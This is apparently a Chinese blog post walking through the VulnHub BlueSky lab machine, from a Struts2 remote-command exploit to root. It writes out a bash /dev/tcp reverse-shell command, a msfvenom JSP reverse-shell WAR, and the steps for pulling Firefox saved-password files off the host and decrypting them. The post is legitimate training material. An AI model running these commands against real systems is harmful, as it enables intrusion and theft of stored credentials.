---
layout:  post    # 使用的布局（不需要改）
title:   VulnHub-BlueSky靶场渗透测试   # 标题 
subtitle:    #副标题
date:  2021-01-27  # 时间
author:  yanmie    # 作者
header-img: img/.jpg ##标签这篇文章标题背景图片
catalog: true      # 是否归档
tags:        
    - Vulnhub


---

### About Release

* **Name**: BlueSky: 1
* **Date release**: 10 Dec 2020
* downpload：https://www.vulnhub.com/entry/bluesky-1,623/
* Goal: Get the root shell i.e.(root@localhost:~#) and then obtain flag under /root).

## 一、信息收集

主机发现：

```
nmap -sP 192.168.56.1/24
```

![image-20210126141945664](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210126141945664.png)

端口扫描：

```bash
nmap -sT -sV -T4 -p- 192.168.56.104
```

![image-20210126142126196](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210126142126196.png)

8080端口tomcat, 22 ssh端口。

但是没啥漏洞。。。

查阅资料结果是 strtus 漏洞。

```
http://192.168.56.104:8080/struts2-showcase/index.action
```

![image-20210126142501422](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210126142501422.png)

## 二、漏洞利用

github上找一波工具。

https://github.com/mazen160/struts-pwn

```bash
➜  struts-pwn git:(master) python3 struts-pwn.py -h
usage: struts-pwn.py [-h] [-u URL] [-l USEDLIST] [-c CMD] [--check]

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     Check a single URL.
  -l USEDLIST, --list USEDLIST
                        Check a list of URLs.
  -c CMD, --cmd CMD     Command to execute. (Default: id)
  --check               Check if a target is vulnerable.
```

![image-20210126142625538](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210126142625538.png)

```bash
➜  struts-pwn git:(master) python3 struts-pwn.py -u http://192.168.56.104:8080/struts2-showcase/index.action -c id 

[*] URL: http://192.168.56.104:8080/struts2-showcase/index.action
[*] CMD: id
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ('Connection broken: IncompleteRead(0 bytes read)', IncompleteRead(0 bytes read))
Note: Server Connection Closed Prematurely

uid=1000(minhtuan) gid=1000(minhtuan) groups=1000(minhtuan),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)

[%] Done.

```

成功远程命令执行，那就 反弹 shell。

kali:

```bash
nc -lvnp 4444
```

靶机：

```bash
python3 struts-pwn.py -u http://192.168.56.104:8080/struts2-showcase/index.action -c "bash -i >& /dev/tcp/192.168.56.102/4444 0>&1"
```

成功反弹 shell.

用户目录下得到`user.txt`

```bash
minhtuan@ubuntu:~$ cat user.txt
cat user.txt
Try your best, you have passed the first challenge, and the last one is for you, root me!
```

接下来寻找 root下的 flag.

寻找 tomcat 密码。

因为web中间件是tomcat，tomcat路径为/usr/local/tomcat，我们可以找到tomcat的用户名密码文件/conf/tomcat-users.xml

```bash
minhtuan@ubuntu:~$ locate users.xml
locate users.xml
/usr/local/tomcat/conf/tomcat-users.xml
```

![image-20210126161826148](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210126161826148.png)

登录 tomcat ,可上传 war 包，

![image-20210126161929668](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210126161929668.png)

`msfvenom` 生成 war包，

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.102 LPORT=5555 -f war>shell.war
```

kali 开启监听:

```bash
nc -lvnp 5555
```

上传 war 包，然后访问

![image-20210126162412576](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210126162412576.png)

利用python升级为交互式 shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

在用户根目录下发现mozilla firefox浏览器文件.可以通过这个得到用户名密码记录。

![image-20210126163114591](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210126163114591.png)

不同版本的Firefox保存密码记录的文件名称不同，在网上找到firefox浏览器存储用户名密码的文件是logins.json（版本号大于等于32.0）或者signons.sqlite（版本号大于等于3.5，小于32.0），可以看[这里](http://kb.mozillazine.org/Profile_folder_-_Firefox).

找到其位置

```bash
minhtuan@ubuntu:~/.mozilla/firefox$ locate logins.json
locate logins.json
/home/minhtuan/.mozilla/firefox/fvbljmev.default-release/logins.json
```

github找解密脚本

https://github.com/lclevy/firepwd

需安装库，但 kali 默认没有 pip3 ，所以安装一下：

```bash
wget https://bootstrap.pypa.io/get-pip.py
python3 get-pip.py
pip3 -V

pip3 install -r requirements.txt
```

靶机开 一个 http 服务

```bash
python3 -m http.server 8001
```

将文件拷贝出来(脚本需要)，kali执行：

```bash
wget http://192.168.56.104:8001/logins.json
wget http://192.168.56.104:8001/key4.db

python3 firepwd.py
```

![image-20210126170858108](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210126170858108.png)

得到账户密码，

## 三、提权

使用sudo -l进行提权，

![image-20210126171329699](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210126171329699.png)

```bash
root@ubuntu:~# cat root.txt
cat root.txt
Amazing, goodjob you!
Thank you for going here

SunCSR Team

```

成功通关。

## 四、总结

信息收集 ---> 8080 tomcat  ---> struts 漏洞 ---> 得到 user.txt 

读取配置文件获取tomcat账号密码 ---> 读取 Firefox保存密码记录 ---> sudo -l 提权 ---> 得到 root.txt

